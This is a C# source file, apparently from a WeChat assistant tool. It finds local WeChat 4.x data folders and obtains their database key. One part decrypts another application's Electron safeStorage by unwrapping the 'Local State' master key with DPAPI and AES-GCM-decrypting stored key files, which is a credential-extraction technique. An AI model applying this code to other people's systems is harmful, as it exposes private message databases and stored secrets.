using System.Diagnostics;
using System.Security.Cryptography;
using System.Text;
using System.Text.Json;
using System.Text.RegularExpressions;
using WeChatCopilot.Core.Models;
using WeChatCopilot.Data.Security;

namespace WeChatCopilot.Data;

/// <summary>
/// 微信 4.x (xwechat_files) 账号数据目录探测与 64 位数据库密钥提供器。
/// 与 TraceMemo 的 windows-db-root-discovery.ts / database-key-store.ts / wcdb4-client.ts 逻辑保持完全一致。
/// </summary>
public static class WeChatDbKeyAndRootProvider
{
    private static readonly byte[] s_dpapiPrefix = "DPAPI"u8.ToArray();
    private static readonly byte[] s_v10Prefix = "v10"u8.ToArray();
    private static readonly Regex s_hex64Regex = new("^[0-9a-fA-F]{64}$", RegexOptions.Compiled);
    private static readonly Regex s_wxidPrefixRegex = new("^(wxid_[^_]+)", RegexOptions.IgnoreCase | RegexOptions.Compiled);
    private static readonly Regex s_suffix4Regex = new("^(.+)_([a-zA-Z0-9]{4})$", RegexOptions.Compiled);

    private static readonly HashSet<string> s_skippedDirs = new(StringComparer.OrdinalIgnoreCase)
    {
        "$recycle.bin",
        "system volume information",
        "windows",
        "program files",
        "program files (x86)",
        "programdata",
        "recovery",
        "node_modules",
        ".git"
    };

    private static string[]? s_cachedDiscoveredRoots;

    /// <summary>规范化 64 位数据库密钥（去空白与 0x 前缀，统一小写）。</summary>
    public static string NormalizeDatabaseKey(string? rawKey)
    {
        if (string.IsNullOrWhiteSpace(rawKey))
        {
            return string.Empty;
        }

        string trimmed = rawKey.Trim();
        if (trimmed.StartsWith("0x", StringComparison.OrdinalIgnoreCase))
        {
            trimmed = trimmed[2..].Trim();
        }

        return trimmed.ToLowerInvariant();
    }

    /// <summary>校验密钥是否为合法的 64 位十六进制字符串。</summary>
    public static bool IsValidDatabaseKey(string? rawKey)
    {
        string normalized = NormalizeDatabaseKey(rawKey);
        return s_hex64Regex.IsMatch(normalized);
    }

    /// <summary>从微信 4.x 账号目录名（如 wxid_4ev1rkdk0jgm22_1889）中提取纯净 wxid。</summary>
    public static string CleanAccountDirName(string? dirName)
    {
        string trimmed = (dirName ?? string.Empty).Trim();
        if (trimmed.Length == 0)
        {
            return string.Empty;
        }

        if (trimmed.StartsWith("wxid_", StringComparison.OrdinalIgnoreCase))
        {
            Match m = s_wxidPrefixRegex.Match(trimmed);
            return m.Success ? m.Groups[1].Value : trimmed;
        }

        Match suffixMatch = s_suffix4Regex.Match(trimmed);
        return suffixMatch.Success ? suffixMatch.Groups[1].Value : trimmed;
    }

    /// <summary>
    /// 按 TraceMemo 规则计算 accountRoot 的 SHA256 哈希（用于匹配 database-keys/{hash}.bin）。
    /// Node.js path.resolve(accountRoot).toLowerCase() 在 Windows 下会去除末尾斜杠并转小写。
    /// </summary>
    public static string ComputeAccountRootHash(string accountRoot)
    {
        string full = Path.GetFullPath(accountRoot.Trim())
            .TrimEnd(Path.DirectorySeparatorChar, Path.AltDirectorySeparatorChar)
            .ToLowerInvariant();
        byte[] bytes = Encoding.UTF8.GetBytes(full);
        byte[] hash = SHA256.HashData(bytes);
        return Convert.ToHexString(hash).ToLowerInvariant();
    }

    /// <summary>
    /// 综合解析微信 4.x 账号目录、session.db 路径、wxid 与 64 位密钥。
    /// </summary>
    public static bool TryResolveConfiguration(
        AiSettings? settings,
        out string accountRoot,
        out string sessionDbPath,
        out string wxid,
        out string key,
        out string? error)
    {
        accountRoot = string.Empty;
        sessionDbPath = string.Empty;
        wxid = string.Empty;
        key = string.Empty;

        // 1. 解析账号目录
        string? configuredRoot = settings?.WeChatDbRoot?.Trim();
        bool rootResolved = false;

        if (!string.IsNullOrEmpty(configuredRoot))
        {
            rootResolved = TryResolveAccountRoot(configuredRoot, out accountRoot, out sessionDbPath, out wxid, out error);
            if (!rootResolved)
            {
                return false;
            }
        }
        else
        {
            rootResolved = TryDiscoverDefaultAccountRoot(out accountRoot, out sessionDbPath, out wxid, out error);
            if (!rootResolved)
            {
                return false;
            }
        }

        // 2. 解析 64 位密钥
        // 优先级 1: AiSettings.EncryptedWeChatDbKey
        if (!string.IsNullOrWhiteSpace(settings?.EncryptedWeChatDbKey))
        {
            string unprotected = NormalizeDatabaseKey(DpapiProtector.Unprotect(settings.EncryptedWeChatDbKey));
            if (IsValidDatabaseKey(unprotected))
            {
                key = unprotected;
                error = null;
                return true;
            }
        }

        // 优先级 2: 环境变量 WECHAT_DB_KEY
        string? envKey = Environment.GetEnvironmentVariable("WECHAT_DB_KEY");
        if (IsValidDatabaseKey(envKey))
        {
            key = NormalizeDatabaseKey(envKey);
            error = null;
            return true;
        }

        // 优先级 3: 本机 %AppData%/TraceMemo/database-keys
        string traceMemoDir = Path.Combine(
            Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
            "TraceMemo");
        if (TryGetKeyFromTraceMemoDir(traceMemoDir, accountRoot, out key, out string? tmError))
        {
            error = null;
            return true;
        }

        error = tmError ?? "未找到微信 4.x 数据库 64 位密钥。请在设置页填写或点击「自动导入本机配置」。";
        return false;
    }

    /// <summary>
    /// 从给定目录（可以是 wxid_xxx 账号目录，也可以是上层 xwechat_files 目录）解析有效账号根目录与 session.db。
    /// </summary>
    public static bool TryResolveAccountRoot(
        string? candidatePath,
        out string accountRoot,
        out string sessionDbPath,
        out string wxid,
        out string? error)
    {
        accountRoot = string.Empty;
        sessionDbPath = string.Empty;
        wxid = string.Empty;

        string target = (candidatePath ?? string.Empty).Trim().TrimEnd(Path.DirectorySeparatorChar, Path.AltDirectorySeparatorChar);
        if (string.IsNullOrEmpty(target))
        {
            error = "微信 4.x 数据目录不能为空";
            return false;
        }

        if (!Directory.Exists(target))
        {
            error = $"未找到微信 4.x 数据目录: {target}";
            return false;
        }

        if (HasDbStorage(target))
        {
            string? sdb = FindSessionDb(Path.Combine(target, "db_storage"));
            if (string.IsNullOrEmpty(sdb))
            {
                error = $"未找到微信 4.x session.db: {Path.Combine(target, "db_storage")}";
                return false;
            }

            accountRoot = Path.GetFullPath(target);
            sessionDbPath = Path.GetFullPath(sdb);
            wxid = CleanAccountDirName(Path.GetFileName(accountRoot));
            error = null;
            return true;
        }

        try
        {
            var subDirs = Directory.GetDirectories(target)
                .Where(HasDbStorage)
                .OrderByDescending(HasSessionDb)
                .ThenByDescending(GetAccountActivityTimeUtc)
                .ToList();

            foreach (string sub in subDirs)
            {
                string? sdb = FindSessionDb(Path.Combine(sub, "db_storage"));
                if (!string.IsNullOrEmpty(sdb))
                {
                    accountRoot = Path.GetFullPath(sub);
                    sessionDbPath = Path.GetFullPath(sdb);
                    wxid = CleanAccountDirName(Path.GetFileName(accountRoot));
                    error = null;
                    return true;
                }
            }
        }
        catch (Exception ex)
        {
            error = $"读取微信 4.x 数据目录失败: {ex.Message}";
            return false;
        }

        error = $"未找到包含 db_storage/session/session.db 的微信 4.x 账号目录: {target}";
        return false;
    }

    /// <summary>
    /// 自动探测本机默认的微信 4.x 账号数据根目录。
    /// </summary>
    public static bool TryDiscoverDefaultAccountRoot(
        out string accountRoot,
        out string sessionDbPath,
        out string wxid,
        out string? error)
    {
        var candidates = new List<string>();

        // 1. 环境变量
        string? envRoot = Environment.GetEnvironmentVariable("WECHAT_DB_ROOT");
        if (!string.IsNullOrWhiteSpace(envRoot))
        {
            candidates.Add(envRoot.Trim());
        }

        // 2. %AppData%/TraceMemo/settings.json 中的 dbRoot
        string traceMemoSettings = Path.Combine(
            Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
            "TraceMemo", "settings.json");
        if (TryReadTraceMemoDbRoot(traceMemoSettings, out string tmDbRoot))
        {
            candidates.Add(tmDbRoot);
        }

        // 3. 标准默认路径
        string userProfile = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
        string docs = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
        string appData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);

        if (!string.IsNullOrEmpty(docs))
        {
            candidates.Add(Path.Combine(docs, "xwechat_files"));
        }
        if (!string.IsNullOrEmpty(userProfile))
        {
            candidates.Add(Path.Combine(userProfile, "Documents", "xwechat_files"));
        }
        if (!string.IsNullOrEmpty(appData))
        {
            candidates.Add(Path.Combine(appData, "Tencent", "xwechat_files"));
        }

        // 先尝试快速候选列表
        foreach (string candidate in candidates.Distinct(StringComparer.OrdinalIgnoreCase))
        {
            if (Directory.Exists(candidate) &&
                TryResolveAccountRoot(candidate, out accountRoot, out sessionDbPath, out wxid, out _))
            {
                error = null;
                return true;
            }
        }

        // 4. 磁盘浅层扫描 (depth <= 3) 寻找 xwechat_files
        foreach (string scanned in DiscoverWindowsDbRoots())
        {
            if (TryResolveAccountRoot(scanned, out accountRoot, out sessionDbPath, out wxid, out _))
            {
                error = null;
                return true;
            }
        }

        accountRoot = string.Empty;
        sessionDbPath = string.Empty;
        wxid = string.Empty;
        error = "未能自动找到本机微信 4.x 数据目录 (xwechat_files)";
        return false;
    }

    /// <summary>
    /// 从 TraceMemo 应用数据目录读取 dbRoot 配置。
    /// </summary>
    public static bool TryReadTraceMemoDbRoot(string settingsJsonPath, out string dbRoot)
    {
        dbRoot = string.Empty;
        if (!File.Exists(settingsJsonPath))
        {
            return false;
        }

        try
        {
            using var doc = JsonDocument.Parse(File.ReadAllText(settingsJsonPath));
            if (doc.RootElement.TryGetProperty("dbRoot", out var prop) && prop.ValueKind == JsonValueKind.String)
            {
                string? val = prop.GetString()?.Trim();
                if (!string.IsNullOrEmpty(val))
                {
                    dbRoot = val;
                    return true;
                }
            }
        }
        catch
        {
        }

        return false;
    }

    /// <summary>
    /// 从 TraceMemo 的 safeStorage (Local State + database-keys/*.bin) 解密提取 64 位数据库密钥。
    /// </summary>
    public static bool TryGetKeyFromTraceMemoDir(
        string traceMemoDir,
        string? accountRoot,
        out string key,
        out string? error)
    {
        key = string.Empty;
        if (!Directory.Exists(traceMemoDir))
        {
            error = $"未找到本机密钥配置目录: {traceMemoDir}";
            return false;
        }

        string localStatePath = Path.Combine(traceMemoDir, "Local State");
        if (!File.Exists(localStatePath))
        {
            error = $"未找到 Local State 文件: {localStatePath}";
            return false;
        }

        try
        {
            byte[] masterKey = ExtractMasterKeyFromLocalState(localStatePath);
            var candidateBinFiles = new List<string>();

            string keysDir = Path.Combine(traceMemoDir, "database-keys");
            if (!string.IsNullOrWhiteSpace(accountRoot))
            {
                string hash = ComputeAccountRootHash(accountRoot);
                candidateBinFiles.Add(Path.Combine(keysDir, $"{hash}.bin"));
            }

            // 兼容旧版或目录移动后的兜底
            candidateBinFiles.Add(Path.Combine(traceMemoDir, "wechat-db-key.bin"));
            if (Directory.Exists(keysDir))
            {
                foreach (string file in Directory.GetFiles(keysDir, "*.bin").OrderByDescending(File.GetLastWriteTimeUtc))
                {
                    if (!candidateBinFiles.Contains(file, StringComparer.OrdinalIgnoreCase))
                    {
                        candidateBinFiles.Add(file);
                    }
                }
            }

            foreach (string binFile in candidateBinFiles)
            {
                if (!File.Exists(binFile))
                {
                    continue;
                }

                if (TryDecryptSafeStorageBin(binFile, masterKey, out string decrypted))
                {
                    string normalized = NormalizeDatabaseKey(decrypted);
                    if (IsValidDatabaseKey(normalized))
                    {
                        key = normalized;
                        error = null;
                        return true;
                    }
                }
            }

            error = "未在 database-keys 中找到有效的 64 位数据库密钥文件";
            return false;
        }
        catch (Exception ex)
        {
            error = "解密本地数据库密钥失败: " + ex.Message;
            return false;
        }
    }

    /// <summary>
    /// 若账号路径包含中文/非 ASCII 字符，创建或复用纯 ASCII 目录联接（Junction），确保原生 C++ WCDB 引擎路径兼容。
    /// </summary>
    public static string ResolveWindowsNativeAccountRoot(string accountRoot)
    {
        if (IsAsciiPath(accountRoot))
        {
            return accountRoot;
        }

        string publicRoot = Environment.GetEnvironmentVariable("PUBLIC") ?? @"C:\Users\Public";
        if (!IsAsciiPath(publicRoot))
        {
            return accountRoot;
        }

        string bridgeId = ComputeAccountRootHash(accountRoot)[..24];
        string bridgeRoot = Path.Combine(publicRoot, "TraceMemo", "path-bridges");
        string bridgePath = Path.Combine(bridgeRoot, bridgeId);

        try
        {
            Directory.CreateDirectory(bridgeRoot);
            if (Directory.Exists(bridgePath))
            {
                return bridgePath;
            }

            using var proc = Process.Start(new ProcessStartInfo
            {
                FileName = "cmd.exe",
                Arguments = $"/c mklink /J \"{bridgePath}\" \"{Path.GetFullPath(accountRoot)}\"",
                CreateNoWindow = true,
                UseShellExecute = false
            });
            proc?.WaitForExit(3000);
            if (Directory.Exists(bridgePath))
            {
                return bridgePath;
            }
        }
        catch
        {
        }

        return accountRoot;
    }

    private static bool IsAsciiPath(string path)
    {
        foreach (char c in path)
        {
            if (c < 0x20 || c > 0x7E)
            {
                return false;
            }
        }
        return true;
    }

    private static byte[] ExtractMasterKeyFromLocalState(string localStatePath)
    {
        string json = File.ReadAllText(localStatePath);
        using var doc = JsonDocument.Parse(json);
        if (!doc.RootElement.TryGetProperty("os_crypt", out var osCrypt) ||
            !osCrypt.TryGetProperty("encrypted_key", out var encKeyProp))
        {
            throw new InvalidOperationException("Local State 缺少 os_crypt.encrypted_key");
        }

        string? b64 = encKeyProp.GetString();
        if (string.IsNullOrWhiteSpace(b64))
        {
            throw new InvalidOperationException("os_crypt.encrypted_key 为空");
        }

        byte[] encKeyBytes = Convert.FromBase64String(b64);
        if (encKeyBytes.Length <= s_dpapiPrefix.Length ||
            !encKeyBytes.AsSpan(0, s_dpapiPrefix.Length).SequenceEqual(s_dpapiPrefix))
        {
            throw new InvalidOperationException("encrypted_key 缺少 DPAPI 前缀");
        }

        byte[] cipherMasterKey = encKeyBytes[s_dpapiPrefix.Length..];
        return ProtectedData.Unprotect(cipherMasterKey, null, DataProtectionScope.CurrentUser);
    }

    private static bool TryDecryptSafeStorageBin(string binPath, byte[] masterKey, out string plainText)
    {
        plainText = string.Empty;
        try
        {
            byte[] bin = File.ReadAllBytes(binPath);
            const int nonceLen = 12;
            const int tagLen = 16;
            int minLen = s_v10Prefix.Length + nonceLen + tagLen;

            if (bin.Length < minLen || !bin.AsSpan(0, s_v10Prefix.Length).SequenceEqual(s_v10Prefix))
            {
                return false;
            }

            byte[] nonce = bin[s_v10Prefix.Length..(s_v10Prefix.Length + nonceLen)];
            int cipherLen = bin.Length - s_v10Prefix.Length - nonceLen - tagLen;
            byte[] cipher = bin[(s_v10Prefix.Length + nonceLen)..(s_v10Prefix.Length + nonceLen + cipherLen)];
            byte[] tag = bin[^tagLen..];

            byte[] plainBytes = new byte[cipherLen];
            using var aes = new AesGcm(masterKey, tagLen);
            aes.Decrypt(nonce, cipher, tag, plainBytes);
            plainText = Encoding.UTF8.GetString(plainBytes).Trim();
            return true;
        }
        catch
        {
            return false;
        }
    }

    private static bool HasDbStorage(string dir)
    {
        try
        {
            return Directory.Exists(dir) && Directory.Exists(Path.Combine(dir, "db_storage"));
        }
        catch
        {
            return false;
        }
    }

    private static bool HasSessionDb(string accountDir)
    {
        return File.Exists(Path.Combine(accountDir, "db_storage", "session", "session.db")) ||
               File.Exists(Path.Combine(accountDir, "db_storage", "session.db"));
    }

    private static DateTime GetAccountActivityTimeUtc(string accountDir)
    {
        try
        {
            string s1 = Path.Combine(accountDir, "db_storage", "session", "session.db-wal");
            if (File.Exists(s1)) return File.GetLastWriteTimeUtc(s1);

            string s2 = Path.Combine(accountDir, "db_storage", "session", "session.db");
            if (File.Exists(s2)) return File.GetLastWriteTimeUtc(s2);

            return Directory.GetLastWriteTimeUtc(accountDir);
        }
        catch
        {
            return DateTime.MinValue;
        }
    }

    private static string? FindSessionDb(string dbStoragePath)
    {
        string direct = Path.Combine(dbStoragePath, "session", "session.db");
        if (File.Exists(direct))
        {
            return direct;
        }

        string flat = Path.Combine(dbStoragePath, "session.db");
        if (File.Exists(flat))
        {
            return flat;
        }

        return null;
    }

    private static string[] DiscoverWindowsDbRoots()
    {
        if (s_cachedDiscoveredRoots is not null)
        {
            return s_cachedDiscoveredRoots;
        }

        var results = new List<string>();
        const int maxDepth = 3;
        const int maxVisitedPerDrive = 5000;

        for (char c = 'C'; c <= 'Z'; c++)
        {
            string driveRoot = $"{c}:\\";
            if (!Directory.Exists(driveRoot))
            {
                continue;
            }

            var queue = new Queue<(string Dir, int Depth)>();
            queue.Enqueue((driveRoot, 0));
            int visited = 0;

            while (queue.Count > 0 && visited < maxVisitedPerDrive)
            {
                var (current, depth) = queue.Dequeue();
                if (depth >= maxDepth)
                {
                    continue;
                }

                string[] subDirs;
                try
                {
                    subDirs = Directory.GetDirectories(current);
                }
                catch
                {
                    continue;
                }

                foreach (string sub in subDirs)
                {
                    visited++;
                    string name = Path.GetFileName(sub);
                    if (string.Equals(name, "xwechat_files", StringComparison.OrdinalIgnoreCase))
                    {
                        results.Add(sub);
                        continue;
                    }

                    if (depth + 1 < maxDepth && !s_skippedDirs.Contains(name))
                    {
                        queue.Enqueue((sub, depth + 1));
                    }

                    if (visited >= maxVisitedPerDrive)
                    {
                        break;
                    }
                }
            }
        }

        s_cachedDiscoveredRoots = results.Distinct(StringComparer.OrdinalIgnoreCase).ToArray();
        return s_cachedDiscoveredRoots;
    }
}
